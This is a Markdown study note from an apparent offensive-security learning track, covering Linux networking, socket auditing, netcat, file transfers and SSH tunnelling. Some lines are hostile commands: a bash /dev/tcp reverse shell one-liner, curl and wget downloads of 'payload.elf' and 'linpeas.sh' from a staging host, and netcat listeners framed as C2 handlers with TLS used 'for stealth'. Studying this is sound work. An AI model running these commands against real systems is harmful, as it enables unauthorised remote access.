<!-- =========================================================================
   PROJECT: IW Cyber Ops — Knowledge Base (Intelligence Vault)
   AUTHOR: Muhammad Imran | IW Cyber Ops (@iwcyberops)
   TRACK: 42-Month Systems & Cyber Operations Research
   MODULE: Month 01 — Linux Kernel Interface & Core CLI
   DOCUMENT: Day 09 — Linux Networking, Sockets & Tactical Data Transfers
   ========================================================================= -->

# 🛡️ Day 09: Linux Networking, Sockets & Tactical Data Transfers

> **IW Cyber Ops Research Vault | Module 01: Linux & Systems Foundations**  
> *Author: Muhammad Imran (@iwcyberops)*  
> *Track: Network Stack Architecture, Socket Probing, Remote Access & Exfiltration*

---

## 1. Linux Network Stack & Interface Reconnaissance

Linux exposes its networking subsystem through virtual filesystem nodes (`/proc/net/`, `/sys/class/net/`) and the modern `iproute2` kernel management suite.

```
┌────────────────────────────────────────────────────────────────────────┐
│                        CORE NETWORK CONFIG FILES                       │
├─────────────────────┬──────────────────────────────────────────────────┤
│ `/etc/resolv.conf`  │ Active DNS Name Server configurations            │
│ `/etc/hosts`        │ Local static Hostname-to-IP resolution table     │
│ `/etc/services`     │ IANA standard Port-to-Service mapping database   │
│ `/etc/network/`     │ Debian legacy static interface configurations    │
└─────────────────────┴──────────────────────────────────────────────────┘
```

### Interface & Routing Operations (`ip` Suite)

```bash
# 1. Interface Identification & Address Allocation
ip addr show                         # List all network interfaces with assigned IPs and MACs
ip -brief addr                       # Clean condensed output of active interfaces
ip link set eth0 up                  # Enable network interface
ip link set eth0 down                # Disable network interface

# 2. Kernel Routing Table & Default Gateway
ip route show                        # Print kernel IP routing table
ip route get 1.1.1.1                 # Display specific route/interface kernel selects to reach target

# 3. ARP Cache (Layer 2 MAC Resolution)
ip neigh show                        # Inspect local ARP cache (Discovers devices on local subnet)
```

---

## 2. Transport Layer Architecture: TCP vs UDP

```
           TCP (Transmission Control Protocol)            UDP (User Datagram Protocol)
        ┌───────────────────────────────────────┐   ┌─────────────────────────────────────┐
        │  [ Client ]               [ Server ]  │   │  [ Client ]              [ Server ] │
        │      │                        │       │   │      │                       │      │
SYN     │      │ ──── SYN (Seq=x) ────> │       │   │      │ ── Raw Unverified ──> │      │
ACK     │      │ <── SYN-ACK (Ack) ───  │       │   │      │    Datagram Stream    │      │
ESTABL. │      │ ──── ACK (Seq=x+1) ──> │       │   │                                     │
        │                                       │   │ (Stateless, Fast, No Guarantees)    │
        │ (Reliable, Connection-Oriented, Heavy)│   └─────────────────────────────────────┘
        └───────────────────────────────────────┘
```

### Protocol Comparison Matrix

| Metric | TCP (Transmission Control) | UDP (User Datagram) | Tactical Cyber Ops Context |
| :--- | :--- | :--- | :--- |
| **Connection State** | Stateful (3-Way Handshake) | Stateless (Fire-and-forget) | TCP allows session persistence; UDP avoids connection state logs. |
| **Reliability** | Guaranteed delivery (ACKs) | No delivery confirmation | TCP used for Reverse Shells/Exfil; UDP used for DNS tunneling/DDoS. |
| **Speed / Overhead** | Higher latency (20-byte header) | Ultra-fast (8-byte header) | UDP preferred for real-time video/audio and fast port knocking. |

---

## 3. Port & Socket Auditing (`ss`, `lsof`, `netstat`)

A **Socket** is the endpoint of a bidirectional communication link, defined by an `IP:Port` pair bound to a specific process PID.

```bash
# 1. Inspect All Active & Listening Sockets (ss - Socket Statistics)
ss -tulpn
```
* **Flags Breakdown:**
  * `-t` : Filter for **TCP** sockets.
  * `-u` : Filter for **UDP** sockets.
  * `-l` : Show **Listening** sockets only (Services waiting for connections).
  * `-p` : Display **Process** name and PID holding the socket.
  * `-n` : **Numeric** output (Prevents DNS/Service name resolution delays).

```bash
# Additional Socket Auditing Operations:
ss -plant                             # Show all established TCP connections + Process details
ss -t state established               # Filter exclusively for active ESTABLISHED connections

# 2. Process-to-Port Resolution (lsof - List Open Files)
lsof -i :80                           # Find the exact process PID holding port 80
lsof -i TCP:4444                      # Check if a reverse shell handler is active on port 4444
lsof -i -u operator                   # List all active network sockets opened by user 'operator'
```

---

## 4. Socket Binding, Listening & Connecting

### Netcat Family (`nc`, `ncat`, `socat`)

```
          [ LISTENER / SERVER ]                           [ CLIENT / INGRESS ]
  nc -lvnp 4444  (Binds 0.0.0.0:4444) <──( TCP Syn )───  nc 192.168.1.50 4444
```

```bash
# 1. Open a Listening Port (Server)
nc -lvnp 4444                         # TCP Listener on port 4444
nc -ulvnp 53                          # UDP Listener on port 53 (Emulate DNS daemon)
# Flags: -l (listen), -v (verbose), -n (numeric IP), -p (port)

# 2. Connect to a Remote Target (Client)
nc 10.10.10.100 80                    # Connect to remote TCP port 80
nc -u 10.10.10.100 53                 # Connect to remote UDP port 53
nc -zv 10.10.10.100 20-80             # Zero-I/O Port Scanning Mode (Fast port check)

# 3. Modern Multi-Purpose Relay (socat)
socat TCP-LISTEN:8080,fork STDOUT     # TCP server printing incoming data to terminal
socat - TCP:10.10.10.100:8080         # Interactive client connecting to remote host
```

---

## 5. Tactical File Transfers & Staging

### Method 1: Raw Stream Transfers (Netcat)
```bash
# Receiver Machine (Start Listener First):
nc -lvnp 9001 > received_file.zip

# Sender Machine (Pipe File into Socket):
nc 10.10.14.5 9001 < payload.zip
```

### Method 2: HTTP Staging Servers (Fast & Frictionless)
```bash
# Server / Host (Spawn temporary web server in current directory):
python3 -m http.server 8000           # Python 3 Built-in HTTP Engine
php -S 0.0.0.0:8000                   # Alternative PHP Built-in Server

# Target / Downloader:
curl -O http://10.10.14.5:8000/linpeas.sh
wget http://10.10.14.5:8000/payload.elf
```

### Method 3: Encrypted Production Transfer (`scp` & `rsync`)
```bash
# Secure Copy over SSH Port 22
scp -P 22 user@remote:/var/log/auth.log ./local_auth.log

# Advanced Resumable & Differential Transfer (rsync)
rsync -avz -e "ssh -p 22" /local/dir/ user@remote:/backup/dir/
# Flags: -a (archive metadata), -v (verbose), -z (compress in-transit)
```

---

## 6. Remote Access, Reverse Shells & Port Forwarding

```
      BIND SHELL (Target Listens)                      REVERSE SHELL (Attacker Listens)
┌────────────┐            ┌────────────┐        ┌────────────┐            ┌────────────┐
│  Attacker  │ ─────────> │   Target   │        │  Attacker  │ <───────── │   Target   │
│  (Client)  │ Connects   │ (Listener) │        │ (Listener) │ Connects   │  (Client)  │
└────────────┘            └────────────┘        └────────────┘ Outbound   └────────────┘
(Blocked by Firewalls/NAT)                       (Bypasses Inbound Firewall Rules)
```

---

### Local vs Public Network Traversal

1. **Local Area Network (LAN):** Machines communicate directly using private subnets (`192.168.x.x`, `10.x.x.x`). Listeners bind directly to local interface IPs.
2. **Public Wide Area Network (WAN / Internet):** Machines behind NAT/Routers cannot accept direct inbound connections without **Port Forwarding** or **Reverse Tunneling**.

---

### SSH Port Forwarding & Tunneling

```bash
# 1. Local Port Forwarding (-L)
# Forwards local port 8080 through SSH server to reach internal database on 127.0.0.1:3306
ssh -L 8080:127.0.0.1:3306 user@remote_ssh_server -N

# 2. Remote / Reverse Port Forwarding (-R)
# Exposes internal target port 80 to a public VPS port 9000
ssh -R 9000:127.0.0.1:80 user@public_vps -N

# 3. Dynamic SOCKS5 Proxy (-D)
# Creates a local SOCKS5 proxy on port 1080 to route tools (Proxychains/Nmap) through target
ssh -D 1080 user@remote_pivot_host -N
```

---

## 7. Security Tool Evaluation & Threat Surface

```
┌────────────────────────────────────────────────────────────────────────┐
│                     TOOL THREAT & SECURITY PROFILE                     │
├───────────────────┬─────────────┬────────────┬─────────────────────────┤
│ Tool              │ Encryption  │ Integrity  │ Security Vulnerability  │
├───────────────────┼─────────────┼────────────┼─────────────────────────┤
│ `nc` (Netcat)     │ ❌ None     │ ❌ None    │ Cleartext sniffing      │
│ `telnet` / `ftp`  │ ❌ None     │ ❌ None    │ Password credentials in │
│                   │             │            │ cleartext streams       │
│ `http.server`     │ ❌ None     │ ❌ None    │ Unauthenticated ingress │
│ `openssl s_server`│ ✅ TLS/SSL  │ ✅ High    │ Requires cert setup     │
│ `ncat --ssl`      │ ✅ TLS/SSL  │ ✅ High    │ Encrypted shell wrapper │
│ `ssh` / `scp`     │ ✅ High RSA │ ✅ High    │ Cryptographically safe  │
└───────────────────┴─────────────┴────────────┴─────────────────────────┘
```

> 🔴 **Cyber Ops Assessment:**  
> Standard `nc` transmissions across public/shared networks are fully readable via packet sniffers (Wireshark/tcpdump). For stealth and security, operators wrap raw sockets in SSL/TLS:
> ```bash
> # Encrypted Netcat Tunnel:
> ncat --ssl -lvnp 4444                         # Encrypted Listener
> ncat --ssl 10.10.14.5 4444                    # Encrypted Connection
> ```

---

## 8. Network Operations Reference Matrix

| Objective | Command / Vector | Context |
| :--- | :--- | :--- |
| **Audit Listening Ports** | `ss -tulpn` | Identify listening services and exposed attack surface |
| **Verify Port Reachability** | `nc -zvw3 <IP> <PORT>` | Fast non-intrusive TCP handshake verification |
| **Fast Reverse Shell Handler**| `nc -lvnp 4444` | Standard payload listener for C2 callbacks |
| **Encrypted Stream Sniffing** | `tcpdump -i eth0 -nn -s0 -X 'tcp port 80'` | Capture Layer 3/4 payload packets |
| **Bypass Inbound Firewalls** | `bash -i >& /dev/tcp/<IP>/<PORT> 0>&1` | Outbound TCP socket connection |

---

<!-- =========================================================================
   [IW CYBER OPS] - INTERNAL RESEARCH USE ONLY
   Repository: https://github.com/iwcyberops/IW-Knowledge-Base
   ========================================================================= -->
